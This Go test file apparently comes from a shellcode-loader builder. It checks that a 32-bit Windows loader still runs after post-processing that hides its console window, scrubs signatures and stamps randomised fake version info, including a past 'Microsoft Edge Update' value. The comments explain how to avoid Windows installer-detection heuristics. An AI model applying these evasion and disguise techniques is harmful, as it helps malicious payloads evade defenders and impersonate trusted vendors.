package util

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"
)

// TestArch386PostProcessRunnable 回归：386（x86）产物经后处理（含随机版本信息）后必须仍能执行。
//
// 背景（真实 bug，勿回退）：
// Windows 对**没有清单的 32 位可执行文件**启用"安装程序检测"启发式——只要版本资源里出现
// Installer / Update / Setup / Assistant 一类字样，CreateProcess 会直接返回
// ERROR_ELEVATION_REQUIRED（"The requested operation requires elevation"）而拒绝启动。
// 实测：386 产物在写入 "Component Installer / Microsoft Edge Update" 后 100% 无法运行；
// x64 不受该启发式影响，所以只看 x64 用例发现不了这个问题。
//
// 修复分两层（缺一不可）：
//  1. 随机版本信息取值池剔除安装程序类字样；
//  2. 统一写入 asInvoker 清单，彻底关闭该启发式。
func TestArch386PostProcessRunnable(t *testing.T) {
	if testing.Short() {
		t.Skip("short mode")
	}
	ensureGoModule(t)
	workDir := filepath.Join(os.TempDir(), "EasyTools", "file")
	outBase := t.TempDir()
	if err := os.MkdirAll(workDir, 0o755); err != nil {
		t.Fatal(err)
	}

	pic := buildX86MarkerPayload(t, workDir)
	if pic == nil {
		t.Skip("x86 标记载荷构建失败（缺 386 工具链？）")
	}
	if err := writeMatrixDataFiles(workDir, pic, ""); err != nil {
		t.Fatal(err)
	}
	bin, err := buildMatrixLoader(t, workDir, outBase, "arch386", "loader1", "一体", "xor", "否", "false", "false", "386", false)
	if err != nil {
		t.Fatalf("386 产物编译失败: %v", err)
	}

	// 后处理（真实 /make 链路：去黑窗口 + 特征清理 + 随机版本信息 + 清单）
	PostProcessBuiltBinary(bin, "windows", false)

	raw, rerr := os.ReadFile(bin)
	if rerr != nil {
		t.Fatal(rerr)
	}
	// 清单必须存在（asInvoker）。应用清单是 UTF-8 XML（不是 UTF-16），按 ASCII 匹配。
	if !bytes.Contains(raw, []byte("asInvoker")) {
		t.Errorf("产物缺少 asInvoker 清单：安装程序检测启发式会导致 386 产物无法启动")
	}
	// 版本信息不得出现安装程序类字样（UTF-16LE 存储）
	for _, bad := range []string{"Component Installer", "Driver Setup", "Update Assistant", "Update Helper", "Update Service"} {
		if containsUTF16(raw, bad) {
			t.Errorf("产物版本信息中出现安装程序类字样 %q（会触发提升权限要求）", bad)
		}
	}

	ok, note := runAndJudge(t, bin, payloadMarker, 10*1e9)
	if !ok {
		t.Fatalf("386 产物经后处理后无法执行: %s", note)
	}
	t.Logf("386 产物后处理后正常运行 ✓（%s）", note)
}

// containsUTF16 判断字节流中是否含指定字符串的 UTF-16LE 编码
func containsUTF16(data []byte, s string) bool {
	needle := make([]byte, 0, len(s)*2)
	for i := 0; i < len(s); i++ {
		needle = append(needle, s[i], 0)
	}
	for i := 0; i+len(needle) <= len(data); i++ {
		match := true
		for j := range needle {
			if data[i+j] != needle[j] {
				match = false
				break
			}
		}
		if match {
			return true
		}
	}
	return false
}
